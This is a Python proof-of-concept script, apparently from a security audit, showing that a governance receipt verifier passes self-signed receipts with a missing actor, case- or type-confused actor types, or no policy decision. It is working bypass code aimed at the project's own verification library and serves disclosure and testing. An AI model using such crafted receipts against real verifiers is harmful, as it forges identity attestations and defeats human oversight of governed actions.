#!/usr/bin/env python3
"""PoC 6 — L3 is a strict-equality sieve: missing/confused actor keys PASS.

verify_receipt enforces L3 only when actor["type"] == "human" exactly. It
never requires an actor to EXIST, never normalizes case, never type-checks,
and never enforces the service side (is_service_account must be true). A
signer that bypasses build_receipt (or a compromised/buggy signing service)
gets PASS on identity-spoofed receipts. The suite only tested POST-signing
tamper (A6/A7/A8), which the signature already defeats; signer-side
construction against the verifier's own law enforcement is untested. S2.8.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

sk, pk = generate_keypair()

def craft(predicate):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": "prod:svc",
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

BASE = {
    "action_id": "a-1",
    "actor": {"type": "human", "id": "s.lutar", "is_service_account": False,
              "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"},
    "policy_decision": {"result": "ALLOW"},
    "execution": {"status": "EXECUTED"},
    "evidence": {"items": [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}],
                 "completeness": "COMPLETE", "redaction_commitments": []},
    "timestamps": {"created": "2026-08-30T00:00:00+00:00",
                   "executed": "2026-08-30T00:00:00+00:00", "ntp_synced": True},
    "prev_chain_hash": "GENESIS",
}

def passes(pred):
    return verify_receipt(craft(pred), pk).verdict == "PASS"

results = []

# (a) No actor key at all — anonymous receipt PASSes.
p = {k: v for k, v in BASE.items() if k != "actor"}
results.append(passes(p))

# (b) Case confusion: "Human" with service-account properties, api_key,
#     no human_principal — L3 never fires.
p = dict(BASE); p["actor"] = {"type": "Human", "id": "agent://ci",
                              "is_service_account": True, "auth_method": "api_key"}
results.append(passes(p))

# (c) Type confusion: list instead of string.
p = dict(BASE); p["actor"] = {"type": ["human"], "id": "agent://ci",
                              "is_service_account": True, "auth_method": "api_key"}
results.append(passes(p))

# (d) Service actor with is_service_account=false, built at signing time
#     (verifier enforces the service side of L3 nowhere).
p = dict(BASE); p["actor"] = {"type": "service", "id": "agent://ci",
                              "is_service_account": False, "auth_method": "api_key"}
results.append(passes(p))

# (e) No policy_decision and no execution — an un-governed "governed action".
p = {k: v for k, v in BASE.items() if k not in ("policy_decision", "execution")}
results.append(passes(p))

print("EXPLOIT-WORKS" if any(results) else "HELD")
